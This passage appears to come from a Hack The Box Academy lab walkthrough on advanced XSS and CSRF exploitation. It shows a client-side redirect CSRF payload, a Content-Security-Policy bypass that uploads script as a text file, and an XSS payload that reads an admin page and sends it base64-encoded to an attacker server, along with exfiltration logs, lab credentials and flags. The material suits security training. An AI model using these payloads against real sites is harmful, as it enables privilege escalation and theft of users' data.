10.129.233.62 - - [05/Jan/2025 10:54:32] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQnsxZTkwNjkwMjFhM2I3M2Y0MWRjMjMwZjNlM2VmNTY4NX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+Cg== HTTP/1.1" 404 -
```

Students need to decode the base64 encoded response, while using `grep` to locate the flag:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQnsxZTkwNjkwMjFhM2I3M2Y0MWRjMjMwZjNlM2VmNTY4NX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+Cg== | base64 -d | grep HTB
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-e4dvsyfpkx]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQnsxZTkwNjkwMjFhM2I3M2Y0MWRjMjMwZjNlM2VmNTY4NX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+Cg== | base64 -d | grep HTB

<p>HTB{1e9069021a3b73f41dc230f3e3ef5685}</p>
```

Answer: `HTB{1e9069021a3b73f41dc230f3e3ef5685}`

## Skills Assessment

### Question 1

#### "Obtain the flag."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb vulnerablesite.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.63 exploitserver.htb vulnerablesite.htb" >> /etc/hosts'
```

Next, students need to open Burpsuite, then subsequently open a browser and browse to `https://vulnerablesite.htb` while intercepting the request. Students need to forward the initial request, then forward the redirect to `/login.php` and inspect the server response:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_52.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_52.png)

Students will find that server's content security policy is set to `script-src 'self'`, where scripts from the same origin as the document are allowed to execute. This prevents execution of scripts not hosted on the originating server. Additionally, the `Set-Cookie` header is set to `HttpOnly` (which instructs the browser that the cookie can only be accessed by the server, and not by client-side scripts) and `SameSite=Strict` (which allows cookies to only be sent if the request originates from the same site that set the cookie).

Now, students need to turn off Burpsuite's Intercept and log in to the vulnerable site using the credentials `htb-stdnt:Academy_student!`. Upon logging in, students will find links on the left hand side of the page for Dashboard, File Management, User Management, Task Management, Admin Panel, and Logout:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_53.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_53.png)

Students need to go to User Management, then click the button to `Promote` the htb-stdnt user:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_54.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_54.png)

Students will find that the promotion attempt makes a request to `/users.php?userid=3`. However, students will also receive the message that "Only moderators and administrators can promote other users!":

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_55.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_55.png)

Consequently, students will need to find a way to have the victim moderator user perform the action of promoting the htb-stdnt user.

Students need to press the `Logout` button on the left hand side of the page, and intercept it with Burpsuite:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_56.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_56.png)

Forwarding the request, students will find the next request is to the endpoint `/index.php?next=/login.php`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_57.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_57.png)

Identifying a client-side redirect, students need craft a payload on the exploit server forcing the victim to visit this endpoint (albeit modified to redirect to `/users.php?userid=3` rather than `/login.php`, causing a promotion of the htb-stdnt user):

Code: html

```html
<script>
document.location = "https://vulnerablesite.htb/index.php?next=/users.php%3fuserid=3";
</script>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_58.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_58.png)

Students need to press `Save` and then `Deliver to Victim`. Then, students need to log back into the vulnerable site and check the User Management tab, confirming they have the moderator role:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_59.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_59.png)

With the moderator role, students are now able add new tasks within the Task Management portion of the vulnerable site, creating an XSS attack vector against the administrator user, who frequently monitors the tasks:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_60.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_60.png)

However, submitting the payload `<script>alert("1")</script>` as a new Task, students will find the page does not execute inline javascript, as no alert appears on screen:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_61.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_61.png)

Therefore, students need to use the File Management page to upload a text file containing the javascript payload, then subsequently submit a payload to the Task Management page that references the text file as the script source:

Code: shell

```shell
echo 'alert("1")' > alert.txt
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-rqggb9lmbe]─[~]
└──╼ [★]$ echo 'alert("1")' > alert.txt
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_62.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_62.png)

After selecting the `alert.txt` file and pressing `Upload` , students need click `Access` to view the text file along with its URL:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_63.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_63.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_64.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_64.png)

Now, students need to return to Task Management, and add a task that references the uploaded text file as a script:

Code: html

```html
<script src="https://vulnerablesite.htb/display_file.php?file_id=1"></script>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_65.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_65.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_66.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_66.png)

Confirming the functionality of the XSS vulnerability, students need to repeat this process, uploading a new text file containing a javascript payload to exfiltrate the contents of the Admin Panel (in this example, we have named the file `admin_panel.txt`):

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_67.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_67.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_68.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_68.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_69.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_69.png)

`Note:` For the rest of the assessment, students will need to continue this process of saving each payload as a text file, uploading it through the file management page and subsequently referencing it as an external script on the task management page. Consequently, these steps will not be explicitly shown in the instructions moving forward.

After a few moments, students need to check their exfiltration server, then decode the base64 encoded response:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:54:32] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:54:32] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8YmFzZSBocmVmPSIuLyI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkNvcmVVSSAtIE9wZW4gU291cmNlIEJvb3RzdHJhcCBBZG1pbiBUZW1wbGF0ZSI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiI+CiAgICA8dGl0bGU+Q29yZVVJIEZyZWUgQm9vdHN0cmFwIEFkbWluIFRlbXBsYXRlPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9ImFzc2V0cy9mYXZpY29uL21hbmlmZXN0Lmpzb24iPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlQ29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2UiIGNvbnRlbnQ9ImFzc2V0cy9mYXZpY29uL21zLWljb24tMTQ0eDE0NC5wbmciPgogICAgPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPCEtLSBWZW5kb3JzIHN0eWxlcy0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJ2ZW5kb3JzL3NpbXBsZWJhci9jc3Mvc2ltcGxlYmFyLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy92ZW5kb3JzL3NpbXBsZWJhci5jc3MiPgogICAgPCEtLSBNYWluIHN0eWxlcyBmb3IgdGhpcyBhcHBsaWNhdGlvbi0tPgogICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDwhLS0gV2UgdXNlIHRob3NlIHN0eWxlcyB0byBzaG93IGNvZGUgZXhhbXBsZXMsIHlvdSBzaG91bGQgcmVtb3ZlIHRoZW0gaW4geW91ciBhcHBsaWNhdGlvbi4tLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9leGFtcGxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayBocmVmPSJ2ZW5kb3JzL0Bjb3JldWkvY2hhcnRqcy9jc3MvY29yZXVpLWNoYXJ0anMuY3NzIiByZWw9InN0eWxlc2hlZXQiPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9IndyYXBwZXIgZC1mbGV4IGZsZXgtY29sdW1uIG1pbi12aC0xMDAgYmctbGlnaHQiPgogICAgICA8aGVhZGVyIGNsYXNzPSJoZWFkZXIgaGVhZGVyLXN0aWNreSBtYi00Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXItZGl2aWRlciI+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgIDxuYXYgYXJpYS1sYWJlbD0iYnJlYWRjcnVtYiI+CiAgICAgICAgICAgIDxvbCBjbGFzcz0iYnJlYWRjcnVtYiBteS0wIG1zLTIiPgogICAgICAgICAgICAgIDxsaSBjbGFzcz0iYnJlYWRjcnVtYi1pdGVtIj4KICAgICAgICAgICAgICAgIDwhLS0gaWYgYnJlYWRjcnVtYiBpcyBzaW5nbGUtLT48c3Bhbj5Ib21lPC9zcGFuPgogICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJicmVhZGNydW1iLWl0ZW0gYWN0aXZlIj48c3Bhbj5BZG1pbiBQYW5lbDwvc3Bhbj48L2xpPgogICAgICAgICAgICA8L29sPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJib2R5IGZsZXgtZ3Jvdy0xIHB4LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1sZyI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICA8aDQgY2xhc3M9ImNhcmQtdGl0bGUgbWItMCI+QWRtaW4gUGFuZWwgLSBDdXN0b21lcnM8L2g0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDwhLS0gTG9hZCBkYXRhIGZyb20gQVBJIC0tPgogICAgICAgICAgICAgIDxzY3JpcHQgc3JjPSJqcy9hcGkuanMiPjwvc2NyaXB0PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1yZXNwb25zaXZlIj4KICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRhYmxlIGJvcmRlciBtYi0wIiBpZD0ibXlUYWJsZSI+CiAgICAgICAgICAgICAgICAgICAgICA8dGhlYWQgY2xhc3M9InRhYmxlLWxpZ2h0IGZ3LXNlbWlib2xkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyIGNsYXNzPSJhbGlnbi1taWRkbGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDx0aD5OYW1lPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgICA8dGg+QWRkcmVzczwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICA8L3RoZWFkPgogICAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8IS0tIC8uY2FyZC5tYi00LS0+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIENvcmVVSSBhbmQgbmVjZXNzYXJ5IHBsdWdpbnMtLT4KICAgIDxzY3JpcHQgc3JjPSJ2Z